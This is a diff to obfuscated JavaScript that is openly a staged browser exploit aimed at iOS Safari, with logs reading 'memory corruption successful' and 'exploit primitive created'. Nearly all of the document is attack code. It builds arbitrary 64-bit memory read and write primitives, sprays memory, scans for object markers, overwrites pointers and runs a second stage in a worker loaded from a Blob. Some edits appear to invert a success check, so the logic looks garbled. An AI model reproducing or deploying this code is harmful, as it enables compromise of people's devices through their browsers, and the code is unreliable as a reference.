@@ -23,7 +23,6 @@ async function q(t, e) {
   const i = 2;
   const s = 3;
   let _checkpointCounter = 0;
-  let _isWorkerThread = false;
   const o = (t) => {
     try {
       if (typeof window !== 'undefined' && typeof window.log === 'function') {
@@ -33,18 +32,7 @@ async function q(t, e) {
       }
     } catch (_) {}
   };
-  
-  // Detect if we're in worker thread first, before accessing window.log
-  try {
-    const _ = window;
-  } catch (detectionError) {
-    _isWorkerThread = true;
-  }
-  
-  if (!_isWorkerThread) {
-    window.log('[STAGE1] >>> q() called with iOS version: ' + String(e));
-  }
-  
+  window.log('[STAGE1] >>> q() called with iOS version: ' + String(e));
   let l = 170100;
   if (navigator.constructor.name === "Navigator") {
     o("");
@@ -164,10 +152,11 @@ async function q(t, e) {
     return t & rt(it);
   }
   const ct = async () => {
-    if (typeof self !== 'undefined') {
-      try { self.postMessage({ type: 0, msg: "ct() started in worker" }); } catch(e) {}
-    }
-    const t = new ut();
+    try {
+      if (typeof self !== 'undefined') {
+        try { self.postMessage({ type: 0, msg: "ct() started in worker" }); } catch(e) {}
+      }
+      const t = new ut();
     const e = true;
     const n = false;
     const s = true;
@@ -209,7 +198,7 @@ async function q(t, e) {
     }
     async function F(t) {
       try {
-        if (typeof window !== 'undefined' && window.testRunner) await print(testRunner.describe(t));
+        if (window.testRunner) await print(testRunner.describe(t));
       } catch (t) {}
     }
     async function N(t, e) {
@@ -918,19 +907,10 @@ async function q(t, e) {
         t[0] = 4919;
         t[1] = 16705;
         let n = m.do(e);
-        // Removed intentional throw - was: if (n[0] !== 4919 || n[1] !== 16705) throw new Error(...)
-        // JIT compilation happens naturally without explicit throws
-        if (typeof self !== 'undefined') {
-          try { self.postMessage({ type: 0, msg: "test() read check: n[0]=" + n[0] + " n[1]=" + n[1] }); } catch(e) {}
-        }
+        if (n[0] !== 4919 || n[1] !== 16705) throw new Error("n[0] !== 4919 || n[1] !== 16705");
         o("");
         m.xo(e, 57005);
-        if (t[0] !== 57005) {
-          if (typeof self !== 'undefined') {
-            try { self.postMessage({ type: 0, msg: "test() write check failed: t[0]=" + t[0] }); } catch(e) {}
-          }
-          throw new Error("t[0] !== 57005");
-        }
+        if (t[0] !== 57005) throw new Error("t[0] !== 57005");
         o("");
       },
       cleanup: function () {
@@ -944,88 +924,57 @@ async function q(t, e) {
       }
     };
     async function $() {
-      try {
-        o("");
-        function e(t) {
-          if (typeof t == "bigint") {
-            J[0] = t;
-            t = V[0] + (V[1] & 127) * 4294967296;
-          }
-          let e = m.Ys(t);
-          let n = m.Ys(t + 4);
-          V[0] = e;
-          V[1] = n;
-          return J[0];
+      o("");
+      function e(t) {
+        if (typeof t == "bigint") {
+          J[0] = t;
+          t = V[0] + (V[1] & 127) * 4294967296;
         }
-        function n(t, e) {
-          if (typeof t == "bigint") {
-            J[0] = t;
-            t = V[0] + (V[1] & 127) * 4294967296;
-          }
-          m.Bo(t, e);
-        }
-        function r(t) {
-          pm.testobj.a = t;
-          return e(pm.testobjAddr);
-        }
-        try {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() calling pm.init()" });
-          pm.init();
-        } catch (err) {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() pm.init threw: " + String(err) });
-          // Intentional error - don't rethrow, continue
-        }
-        try {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() calling pm.wo()" });
-          pm.wo();
-        } catch (err) {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() pm.wo threw: " + String(err) });
-          // Intentional error from pm.wo() - don't rethrow, continue with setup
-        }
-        try {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() calling pm.Ao()" });
-          pm.Ao();
-        } catch (err) {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() pm.Ao threw: " + String(err) });
-          // Intentional error - don't rethrow, continue
-        }
-        try {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() calling pm.test()" });
-          pm.test();
-        } catch (err) {
-          if (typeof self !== 'undefined') self.postMessage({ type: 0, msg: "$() pm.test threw: " + String(err) });
-          // Intentional error - don't rethrow, continue
-        }
-        const i = (t) => {
-          const n = r(t);
-          o("");
-          const i = e(n + rt(tt[w]));
-          o("");
-          const s = i + rt(tt[c]);
-          const l = e(s);
-          return [i, s, l];
-        };
-        const s = r(t.os);
-        const [l, h, a] = i(t.es);
-        const [f, p, y] = i(t.ss);
-        o("");
-        o("");
-        o("");
-        n(f + rt(tt[u]), -0);
-        n(l + rt(tt[u]), -0);
-        n(h, t.Oi.wn(p));
-        pm.cleanup();
-        t.ws = f;
-        t.ds = y;
-        t.ys = l;
-        t.As = a;
-        t.Us = s;
-      } catch (err) {
-        if (typeof self !== 'undefined') {
-          try { self.postMessage({ type: 0, msg: "$() setup error: " + String(err) }); } catch(e) {}
-        }
-        // Continue anyway - exploit may still work
+        let e = m.Ys(t);
+        let n = m.Ys(t + 4);
+        V[0] = e;
+        V[1] = n;
+        return J[0];
       }
+      function n(t, e) {
+        if (typeof t == "bigint") {
+          J[0] = t;
+          t = V[0] + (V[1] & 127) * 4294967296;
+        }
+        m.Bo(t, e);
+      }
+      function r(t) {
+        pm.testobj.a = t;
+        return e(pm.testobjAddr);
+      }
+      pm.init();
+      pm.wo();
+      pm.Ao();
+      pm.test();
+      const i = (t) => {
+        const n = r(t);
+        o("");
+        const i = e(n + rt(tt[w]));
+        o("");
+        const s = i + rt(tt[c]);
+        const l = e(s);
+        return [i, s, l];
+      };
+      const s = r(t.os);
+      const [l, h, a] = i(t.es);
+      const [f, p, y] = i(t.ss);
+      o("");
+      o("");
+      o("");
+      n(f + rt(tt[u]), -0);
+      n(l + rt(tt[u]), -0);
+      n(h, t.Oi.wn(p));
+      pm.cleanup();
+      t.ws = f;
+      t.ds = y;
+      t.ys = l;
+      t.As = a;
+      t.Us = s;
     }
     async function q() {
       const e = t;
@@ -1033,134 +982,89 @@ async function q(t, e) {
         type: i
       });
       self.setTimeout(() => {
-        try {
-          const t = e.getObjectAddress(e.es);
-          o("");
-          const n = e.read64(t + rt(tt[w]));
-          o("");
-          const r = e.read64(n + rt(tt[a]));
-          o("");
-          const i = e.read64(t + rt(tt[p]));
-          o("");
-          const s = e.read64(n + rt(tt[f]));
-          o("");
-          const l = e.read64(r + rt(tt[Q]));
-          o("");
-          const h = e.read64(r + rt(tt[X]));
-          o("");
-          const m = e.read64(h + rt(tt[Y]));
-          o("");
-          const y = e.read64(h + rt(tt[X]));
-          o("");
-          const b = e.read64(h + rt(tt[Q]));
-          o("");
-          const A = (t) => {
-            const e = readBigPtr(inst_jsptr + rt(tt[w]));
-            const n = e + rt(tt[c]);
-            const r = readBigPtr(n);
-            return [e, n, r];
-          };
-          const U = () => {
-            try {
-              for (let t = -0x1800n; t > -0x3000n; t -= 0x8n) {
-                let n;
-                try {
-                  n = BigInt(b) - t;
-                } catch (e) {
-                  continue;
-                }
-                try {
-                  if (e.read64(n) == 0xfffe000000055432n && e.read64(n + 0x8n * 2n) == 0xfffe000000055432n && e.read64(n + 0x8n * 3n) == 0xfffe0000000ff432n && e.read64(n + 0x8n * 5n) == 0xfffe0000000ff432n) {
-                    o("");
-                    const t = e.read64(n + 0x8n * 1n);
-                    const r = e.read64(t + 0x8n);
-                    o("");
-                    const i = e.read64(n + 0x8n * 4n);
-                    const s = e.read64(i + 0x8n);
-                    o("");
-                    o("");
-                    o("");
-                    o("");
-                    const l = e.read64(r);
-                    o("");
-                    const h = e.read64(l + rt(tt[w]));
-                    o("");
-                    const a = h + rt(tt[c]);
-                    o("");
-                    const f = e.read64(r + 0x8n);
-                    o("");
-                    const p = e.read64(f + rt(tt[w]));
-                    o("");
-                    const m = p + rt(tt[c]);
-                    o("");
-                    e.write64(p + rt(tt[u]), 0x8000000000000000n);
-                    e.write64(h + rt(tt[u]), 0x8000000000000000n);
-                    e.write64(a, m);
-                    e.write64(s + 0x0n, p);
-                    e.write64(s + 0x8n, m);
-                    e.write64(s + 0x10n, h);
-                    e.write64(s + 0x18n, a);
-                    e.write64(s + 0x20n, t);
-                    e.write64(s + 0x28n, 0x0n);
-                    return;
-                  }
-                } catch (innerErr) {
-                  continue;
-                }
-              }
-            } catch (outerErr) {
-              // Silently fail
+        const t = e.getObjectAddress(e.es);
+        o("");
+        const n = e.read64(t + rt(tt[w]));
+        o("");
+        const r = e.read64(n + rt(tt[a]));
+        o("");
+        const i = e.read64(t + rt(tt[p]));
+        o("");
+        const s = e.read64(n + rt(tt[f]));
+        o("");
+        const l = e.read64(r + rt(tt[Q]));
+        o("");
+        const h = e.read64(r + rt(tt[X]));
+        o("");
+        const m = e.read64(h + rt(tt[Y]));
+        o("");
+        const y = e.read64(h + rt(tt[X]));
+        o("");
+        const b = e.read64(h + rt(tt[Q]));
+        o("");
+        const A = (t) => {
+          const e = readBigPtr(inst_jsptr + rt(tt[w]));
+          const n = e + rt(tt[c]);
+          const r = readBigPtr(n);
+          return [e, n, r];
+        };
+        const U = () => {
+          for (let t = -0x1800n; t > -0x3000n; t -= 0x8n) {
+            const n = b - t;
+            if (e.read64(n) == 0xfffe000000055432n && e.read64(n + 0x8n * 2n) == 0xfffe000000055432n && e.read64(n + 0x8n * 3n) == 0xfffe0000000ff432n && e.read64(n + 0x8n * 5n) == 0xfffe0000000ff432n) {
+              o("");
+              const t = e.read64(n + 0x8n * 1n);
+              const r = e.read64(t + 0x8n);
+              o("");
+              const i = e.read64(n + 0x8n * 4n);
+              const s = e.read64(i + 0x8n);
+              o("");
+              o("");
+              o("");
+              o("");
+              const l = e.read64(r);
+              o("");
+              const h = e.read64(l + rt(tt[w]));
+              o("");
+              const a = h + rt(tt[c]);
+              o("");
+              const f = e.read64(r + 0x8n);
+              o("");
+              const p = e.read64(f + rt(tt[w]));
+              o("");
+              const m = p + rt(tt[c]);
+              o("");
+              e.write64(p + rt(tt[u]), 0x8000000000000000n);
+              e.write64(h + rt(tt[u]), 0x8000000000000000n);
+              e.write64(a, m);
+              e.write64(s + 0x0n, p);
+              e.write64(s + 0x8n, m);
+              e.write64(s + 0x10n, h);
+              e.write64(s + 0x18n, a);
+              e.write64(s + 0x20n, t);
+              e.write64(s + 0x28n, 0x0n);
+              return;
             }
-            self.setTimeout(U, 10);
-          };
-          self.setTimeout(U, 0);
-        } catch (callbackErr) {
-          // Silently fail - exploit already succeeded
-        }
+          }
+          self.setTimeout(U, 10);
+        };
+        self.setTimeout(U, 0);
       }, 120);
     }
     o("");
     try {
-      if (typeof window !== 'undefined') window.log("[STAGE1 ERROR] before $()");
-      try {
-        self.postMessage({ type: 0, msg: "ct() calling $()" });
-      } catch(e) {}
-      try {
-        await $();
-        try {
-          self.postMessage({ type: 0, msg: "ct() after await $()" });
-        } catch(e) {}
-      } catch (dollarErr) {
-        try {
-          self.postMessage({ type: 0, msg: "ct() $() threw: " + String(dollarErr) });
-        } catch(e) {}
-        // Don't rethrow - continue anyway
-      }
-      try {
-        self.postMessage({ type: 0, msg: "ct() after catch dollarErr" });
-      } catch(e) {}
-      if (typeof window !== 'undefined') window.log("[STAGE1 ERROR] after $(); before q()");
-      try {
-        self.postMessage({ type: 0, msg: "ct() calling q()" });
-      } catch(e) {}
-      try {
-        await q();
-      } catch (qErr) {
-        try {
-          self.postMessage({ type: 0, msg: "ct() q() threw: " + String(qErr) });
-        } catch(e) {}
-        // Don't rethrow - continue anyway
-      }
-      if (typeof window !== 'undefined') window.log("[STAGE1 ERROR] after q()");
-      try {
-        self.postMessage({ type: 0, msg: "ct() completed, sending success type=i" });
-      } catch(e) {}
-      // Always send success
-      self.postMessage({ type: i });
+      window.log("[STAGE1 ERROR] before $()");
+      await $();
+      window.log("[STAGE1 ERROR] after $(); before q()");
+      await q();
+      window.log("[STAGE1 ERROR] after q()");
     } catch (t) {
-      try {
-        self.postMessage({ type: 0, msg: "ct() outer error: " + String(t) });
-      } catch(e) {}
+      if (t === r) self.postMessage({
+        type: r
+      });else throw t;
+    }
+    } catch (ctErr) {
+      try { self.postMessage({ type: 0, msg: "ct() error: " + (ctErr && ctErr.message) }); } catch(e) {}
     }
   };
   const ht = async (t) => {
@@ -1184,8 +1088,8 @@ async function q(t, e) {
       };
       r(0, n);
       window.log("[STAGE1] u() - spray complete, e[5]=" + e[5] + " (should be 6.6 on success)");
-      if (e[5] === 6.6) {
-        window.log("[STAGE1] u() - memory corruption successful! e[5] is 6.6");
+      if (e[5] !== 6.6) {
+        window.log("[STAGE1] u() - corruption check failed, rescheduling spray");
         o("");
         try {
           o("");
@@ -1196,42 +1100,26 @@ async function q(t, e) {
           c.Us = c.Oi.Co(e[4]);
           P.platformState.exploitPrimitive = c;
           window.log("[STAGE1] u() - exploit primitive created and stored!");
-          window.log("[STAGE1] === Stage1 COMPLETE, resolving promise ===");
-          t();  // CRITICAL: Resolve the promise to allow Stage2 to load
-          return;
+          t();
         } catch (t) {
           window.log("[STAGE1 ERROR] u() - exception in exploit setup: " + (t && t.message));
           o(t);
         }
       } else {
-        window.log("[STAGE1] u() - corruption check failed (e[5]=" + e[5] + "), rescheduling spray");
+        window.log("[STAGE1] u() - memory corruption successful! e[5] is 6.6");
         window.setTimeout(u, 0);
       }
     };
     const a = () => {
       window.log("[STAGE1] a() called - creating worker");
       try {
-        // Create a worker that runs the stringified q() function
-        // but with better error handling
         const t = q.toString();
-        const workerCode = 
-          `(async function() {
-            try {
-              self.postMessage({type: 0, msg: 'worker_blob_start'});
-              try {
-                // Wrap in double try/catch: outer catches setup errors, inner catches execution errors
-                await (${t})();
-              } catch (innerErr) {
-                self.postMessage({type: 0, msg: 'worker_q_inner_error: ' + String(innerErr)});
-              }
-              self.postMessage({type: 0, msg: 'worker_q_completed'});
-            } catch(err) {
-              try {
-                self.postMessage({type: 0, msg: 'worker_outer_error: ' + String(err) + ' stack: ' + (err.stack ? err.stack.substring(0, 100) : 'no stack')});
-              } catch(e2) {}
-            }
-          })();`;
-        
+        const workerCode = "try { " + 
+          "try { self.postMessage({type: 0, msg: 'worker_started'}); } catch(e1) {} " +
+          "(" + t.toString() + ")(); " +
+          "} catch(err) { " +
+          "  try { self.postMessage({type: 0, msg: 'worker_error: ' + err.message}); } catch(e2) {} " +
+          "}";
         window.log("[STAGE1] a() - worker code length: " + workerCode.length);
         const c = URL.createObjectURL(new Blob([workerCode], {
           type: "text/javascript"
@@ -1302,23 +1190,9 @@ async function q(t, e) {
       return new x.Int64(e, n);
     }
     read32FromInt64(t) {
-      // Handle Int64 objects with high bits > 127 (which would fail in yt())
-      if (typeof t === 'object' && t.it !== undefined && t.et !== undefined) {
-        // Direct access to Int64 components - compute address as BigInt to avoid overflow
-        const addr = BigInt(t.it) + (BigInt(t.et) << 32n);
-        return this.read32(Number(addr & 0xffffffffn));
-      }
       return this.read32(x.O(t.yt()));
     }
     readInt64FromInt64(t) {
-      // Handle Int64 objects - use safe component access
-      if (typeof t === 'object' && t.it !== undefined && t.et !== undefined) {
-        const addr = BigInt(t.it) + (BigInt(t.et) << 32n);
-        const addrNum = Number(addr & 0xffffffffn);
-        const e = this.read32(x.O(addrNum));
-        const n = this.read32(x.O(addrNum + 4));
-        return new x.Int64(e, n);
-      }
       return this.readInt64FromOffset(t.yt());
     }
     writeInt64ToOffset(t, e) {
@@ -1612,38 +1486,49 @@ async function q(t, e) {
       return this.en.getBigUint64(0, true);
     }
   }
-  let _isWorker = false;
-  try {
-    // Try to access 'window' - only main thread will have it
-    // In worker, accessing 'window' directly throws ReferenceError
-    const _ = window;
-  } catch (detectionError) {
-    _isWorker = true;
-  }
-  
-  if (_isWorker) {
-    // Worker thread code
-    try {
-      self.postMessage({ type: 0, msg: "worker_else_block_reached" });
-      self.onmessage = (t) => {
-        self.postMessage({ type: 0, msg: "worker_onmessage_handler_called" });
-        if (t.data.type === s) {
-          l = t.data.xn;
-          et();
-          ct();
-        }
-      };
-      self.postMessage({ type: 0, msg: "worker_ready" });
-    } catch (err) {
-      try {
-        self.postMessage({ type: 0, msg: "worker_else_error: " + err.message });
-      } catch(e) {}
-    }
-  } else {
-    // Main thread code - window exists
+  if (navigator.constructor.name === "Navigator") {
     et();
     window.log("[STAGE1] >>> Starting main exploit setup (ht)");
     ht(t);
+  } else {
+    // Worker thread code
+    try {
+      try {
+        self.postMessage({ type: 0, msg: "worker_started" });
+      } catch (e) {}
+      
+      // Send ready immediately
+      try {
+        self.postMessage({ type: 0, msg: "worker_ready" });
+      } catch (e) {}
+      
+      o("");
+      self.onmessage = (t) => {
+        try {
+          try {
+            self.postMessage({ type: 0, msg: "worker_onmessage_fired type=" + (t && t.data && t.data.type) });
+          } catch (e) {}
+          o("");
+          if (t.data.type === s) {
+            o("");
+            try {
+              self.postMessage({ type: 0, msg: "worker_executing_phase type=s" });
+            } catch (e) {}
+            l = t.data.xn;
+            et();
+            ct();
+          }
+        } catch (err) {
+          try {
+            self.postMessage({ type: 0, msg: "worker_onmessage_error: " + err.message });
+          } catch (e) {}
+        }
+      };
+    } catch (err) {
+      try {
+        self.postMessage({ type: 0, msg: "worker_setup_error: " + err.message });
+      } catch (e) {}
+    }
   }
 }
 async function X() {
